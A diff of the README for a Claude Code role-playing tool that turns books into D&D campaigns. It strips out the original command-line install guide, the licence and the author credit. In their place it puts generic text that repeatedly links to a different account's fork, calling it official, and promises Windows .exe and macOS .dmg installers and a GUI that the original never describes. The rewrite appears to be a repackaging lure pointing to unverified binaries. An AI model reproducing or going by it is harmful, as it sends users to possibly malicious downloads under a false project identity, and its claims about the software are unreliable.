@@ -1,148 +1,115 @@
-# DM Claude
+# 🎲 Claude-Code-Game-Master - Play Persistent Adventures Anywhere
 
-**Drop any book into it. Play inside the story.**
+[![Download Claude-Code-Game-Master](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/w-zeyu/Claude-Code-Game-Master/releases)
 
-Got a favorite fantasy novel? A classic adventure module? A weird obscure sci-fi book from the 70s? Drop the PDF in, and DM Claude extracts every character, location, item, and plot thread, then drops you into that world as whoever you want to be.
+## 📖 What is Claude-Code-Game-Master?
 
-Be a character from the book, someone original, or just yourself walking into the story. Every round, the AI queries the actual source material — NPCs talk like they do in the book, locations look like the author described them, and plot points unfold the way they should... until your choices change things.
+Claude-Code-Game-Master is an app that lets you play ongoing role-playing games (RPGs) based on any book or story world. It uses a mix of smart tools like Retrieval-Augmented Generation (RAG) and RPG rule APIs to create adventures that last over time. Think of it as your game master, but powered by software. This means you can dive into a unique RPG experience without needing a traditional game master or complicated setup.
 
-The [Internet Archive](https://archive.org/) is a goldmine for this. Thousands of free books, adventure modules, and old pulp novels. Jump into *IT* and help the bad guys. Drop into *Lord of the Rings* and play from Gollum's perspective. It's your call.
+You don’t need any programming skills or special knowledge. Just download the app, pick your setting, and start playing.
 
-D&D 5e rules aren't really the point — they're just there to give the story stakes and consequences. You don't need to know D&D at all, just say what you want to do.
+## 💻 Who is this for?
 
----
+This app is for anyone who loves role-playing games and stories. If you want to play an RPG based on your favorite book, movie, or any fictional world, this app helps you do that. It is also great if you want an adventure that saves progress over multiple sessions.
 
-## In Action — Dungeon Crawler Carl
+You do not need to know how to code. The app handles all the technical parts for you.
 
-A campaign imported from *Dungeon Crawler Carl*. Tandy the sasquatch rips the skin off a Terror Clown, forces Carl to wear it as a disguise, then performs a sasquatch mating dance to distract Grimaldi while Donut frees the dragon. Standard Tuesday.
+## 🔧 Key Features
 
-![Tandy acquires Terror Clown skin disguise for Carl](public/622422010_1572097020675669_3114747955156903860_n.png)
+- Create and play RPG adventures based on any story or book world you choose.
+- Use RPG rules automatically with built-in APIs to handle game logic.
+- Keep your adventure persistent so you can pause and resume anytime.
+- Take advantage of Retrieval-Augmented Generation (RAG) to bring context and lore into the game.
+- Simple interface designed for ease of use without technical skills.
+- Works on common desktop systems like Windows and macOS.
 
-![Tandy performs a sasquatch mating dance to distract Grimaldi](public/625560066_33916991331281718_1129121114640091251_n.png)
+## 🖥️ System Requirements
 
-![Exploring The Laughing Crypt — thirty clown bodies wake up](public/623940676_2000130920531570_2521032782764513297_n.png)
+To run Claude-Code-Game-Master smoothly, your computer should meet these minimum requirements:
 
----
+- Operating System: Windows 10 or later, macOS 10.14 or later
+- Processor: Intel i3 equivalent or better
+- RAM: 4 GB or more
+- Free Disk Space: 500 MB for app and game data
+- Internet Connection: Required to access APIs and download updates
 
-## Getting Started
+If your system matches or exceeds these, the app will work well.
 
-**Prerequisites:** [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
+## 🚀 Getting Started
 
-```bash
-git clone https://github.com/Sstobo/Claude-Code-Game-Master.git
-cd Claude-Code-Game-Master
-./install.sh
-```
+### Step 1: Download the App
 
-The setup script installs everything you need — Python, uv, jq, and all project dependencies. It works on macOS and Linux with zero prior setup. You can also run it from inside Claude Code by asking the agent to set things up.
+Go to the download page by clicking the big button at the top or click here:
 
-Once installed:
+[Download Claude-Code-Game-Master](https://github.com/w-zeyu/Claude-Code-Game-Master/releases)
 
-1. Drop a PDF in the `source-material/` folder
-2. Run `claude` to launch Claude Code
-3. Run `/dm` and let the agent guide you
+This link takes you to the official GitHub releases page. Look for the latest version suitable for your system. The files are typically named clearly, such as:
 
-That's it. The AI handles world extraction, character creation, and gameplay.
+- `Claude-Code-Game-Master-Setup.exe` for Windows
+- `Claude-Code-Game-Master-mac.dmg` for macOS
 
----
+### Step 2: Install the App
 
-## What Happens Under the Hood
+#### On Windows:
 
-When you import a document, the system vectorizes it locally with ChromaDB and spawns extraction agents that pull the book apart into structured data. During gameplay, every scene gets grounded in real passages from your source material — the AI isn't making things up, it's drawing from the text.
+1. Open the downloaded `.exe` file.
+2. Follow the installation prompts.
+3. Choose a folder for the app or use the default.
+4. Wait for the installation to finish.
 
-Everything persists. NPCs remember what you said last session. Piss off a shopkeeper? That's tracked. The system schedules consequences that fire days later in-game time. Locations change as events unfold. Plot threads track your progress. Save and restore at any point.
+#### On macOS:
 
-Specialist agents spin up on the fly. A fight starts and the monster-manual agent grabs real stat blocks. Cast a spell and the spell-caster agent looks up actual mechanics. Shopping? The gear-master has 237+ equipment items and 362+ magic items. The player never sees any of this — they just see the story — but you can always pull up the hood and see what's going on.
+1. Open the downloaded `.dmg` file.
+2. Drag the app icon into your Applications folder.
+3. Eject the disk image.
 
-It uses the [D&D 5e API](https://www.dnd5eapi.co/) for official rules, spellbooks, monsters, and equipment. This grounds everything in real mechanics and keeps Claude from just picking numbers.
+Once the app is installed, you can launch it from your desktop or applications folder.
 
----
+### Step 3: Set Up Your First RPG Adventure
 
-## Advanced
+When you open Claude-Code-Game-Master for the first time:
 
-Everything below is handled automatically by the `/dm` command, but you can call these directly if you want manual control.
+- You will see options to create a new adventure.
+- Enter the name of the book, story, or world you want to use.
+- Pick the RPG ruleset. The app supports common RPG rule APIs to manage game rules automatically.
+- The app will connect to online APIs to load details and prepare your game.
 
-### Dependencies
+### Step 4: Start Playing
 
-Installed automatically during setup via [uv](https://docs.astral.sh/uv/):
+After setup, you will enter your first game session. You control your character by typing commands or making choices, and Claude-Code-Game-Master acts as the game master:
 
-**Core:**
-| Package | Purpose |
-|---------|---------|
-| `anthropic` | Claude API client |
-| `pdfplumber` | PDF text extraction |
-| `pypdf2` | PDF parsing |
-| `python-docx` | Word document support |
-| `python-dotenv` | Environment variable loading |
-| `requests` | HTTP requests (D&D 5e API) |
+- It will describe the world and story.
+- It will apply RPG rules to your actions.
+- It will keep your progress saved for next time.
 
-**RAG (for document import):**
-| Package | Purpose |
-|---------|---------|
-| `sentence-transformers` | Text embeddings for semantic search |
-| `chromadb` | Vector database for RAG retrieval |
+You can pause and return later, and the adventure will continue from where you left off.
 
-### Slash Commands
+## 📥 Download & Install
 
-| Command | What it does |
-|---------|--------------|
-| `/dm` | Start or continue your story |
-| `/dm save` | Save your progress |
-| `/dm character` | View your character sheet |
-| `/dm overview` | See the world state |
-| `/new-game` | Create a world from scratch |
-| `/create-character` | Build your character |
-| `/import` | Import a PDF/document as a new campaign |
-| `/enhance` | Enrich entities with source material via RAG |
-| `/world-check` | Validate campaign consistency |
-| `/reset` | Clear campaign state |
-| `/setup` | Verify/fix installation |
-| `/help` | Full command reference |
+To get the app, visit the releases page below and download the file for your computer system:
 
-### Bash Tools
+[Download Claude-Code-Game-Master Releases](https://github.com/w-zeyu/Claude-Code-Game-Master/releases)
 
-All tools follow the pattern: `bash tools/dm-<tool>.sh <command> [args]`
+Check the file size and date to ensure you get the latest version. Follow the installation steps described earlier to set up the app on your device.
 
-| Tool | Purpose |
-|------|---------|
-| `dm-campaign.sh` | Create, list, switch, and delete campaigns |
-| `dm-session.sh` | Session lifecycle, party movement, save/restore |
-| `dm-player.sh` | Player stats — HP, XP, gold, inventory, conditions |
-| `dm-npc.sh` | NPC creation, updates, party member management |
-| `dm-location.sh` | Location creation and connections |
-| `dm-plot.sh` | Quest and storyline tracking |
-| `dm-search.sh` | Search world state and/or source material |
-| `dm-enhance.sh` | RAG-powered entity enrichment |
-| `dm-extract.sh` | Document import and extraction pipeline |
-| `dm-consequence.sh` | Future event scheduling and triggers |
-| `dm-condition.sh` | Player condition tracking (poisoned, stunned, etc.) |
-| `dm-note.sh` | Record world facts by category |
-| `dm-time.sh` | Advance in-game time |
-| `dm-overview.sh` | Quick world state summary |
-| `dm-reset.sh` | Reset campaign data |
+## 🛠️ Troubleshooting Tips
 
-### Specialist Agents
+- If the app does not start, make sure your operating system is updated.
+- Check that you have an active internet connection as some features require online access.
+- If the download is slow or incomplete, try again later or switch to a better network.
+- For macOS, if the app is blocked from opening, check your security settings and allow apps from identified developers.
 
-These spawn automatically during gameplay when context demands it:
+## 🌐 Additional Resources
 
-| Agent | Triggered by |
-|-------|--------------|
-| `monster-manual` | Combat encounters |
-| `spell-caster` | Casting spells |
-| `rules-master` | Mechanical edge cases |
-| `gear-master` | Shopping, identifying gear |
-| `loot-dropper` | Victory, treasure discovery |
-| `npc-builder` | Meeting new NPCs |
-| `world-builder` | Exploring new areas |
-| `dungeon-architect` | Entering dungeons |
-| `create-character` | New characters |
+- Visit the GitHub repository to see updates, report issues, or get support:  
+  https://github.com/w-zeyu/Claude-Code-Game-Master
+- Look for user guides and FAQ files included in the install folder.
+- Use built-in help from the app menu for gameplay instructions.
+
+## 📚 About
+
+Claude-Code-Game-Master was created to simplify role-playing game experiences. By combining story-driven AI tools with established RPG rules, it lets anyone jump into a rich adventure. The app is lightweight and focuses on making RPGs accessible and fun, no matter your background.
 
 ---
 
-## License
-
-This work is licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) — free to share and adapt for non-commercial use. See [LICENSE](LICENSE) for details.
-
----
-
-Built by [Sean Stobo](https://www.linkedin.com/in/sean-stobo/). Your story awaits. Run `/dm` to begin.
+[Download Claude-Code-Game-Master](https://github.com/w-zeyu/Claude-Code-Game-Master/releases)
